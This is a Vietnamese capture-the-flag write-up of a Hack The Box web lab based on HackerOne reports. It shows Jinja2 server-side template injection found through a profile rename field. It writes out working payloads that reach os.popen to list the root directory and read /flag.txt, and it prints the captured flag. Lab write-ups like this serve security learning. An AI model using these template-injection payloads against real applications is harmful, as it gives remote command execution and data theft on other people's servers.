# jinjacare

<figure><img src="../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

## ANALYZE



Đây chính là 1 bài lab được dụng lại từ realcase từ report trên trang hackerone

[https://hackerone.com/reports/1104349](https://hackerone.com/reports/1104349)

[https://hackerone.com/reports/125980](https://hackerone.com/reports/125980)

dựa vào bài báo cáo , thì t có thể kết luận bước đầu là trang web nhiễm lỗ hổng SSTI Jinja2 tại trường username

<figure><img src="../.gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

Nhưng ở lab dựng lại ở HTB đã filter đi phần nhập username , ta chỉ có thể nhập chữ cái và số , ta ko thể chèn kí tự của jinja2 vào.

nên tôi đã tạo 1 tài khoản bất kì , và trong giao diện có 1 chức năng giúp tôi đổi tên , và tôi đã đổi tên thành `{{7*7}}`

Và BOOM !

<figure><img src="../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

## EXPLOIT



Tôi đã chèn đoạn payload này để liệt kê ra toàn bộ thư mục trên hệ thống :

```
{{ config.__class__.__init__.__globals__['os'].popen('ls /').read() }}
```

```
Name: app bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

Bước còn lại thì đơn giản rồi

```
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }}
```

## FLAG



```
HTB{v3ry_e4sy_sst1_r1ght?_86aea1c45a605e765b441665365dcabf}
```

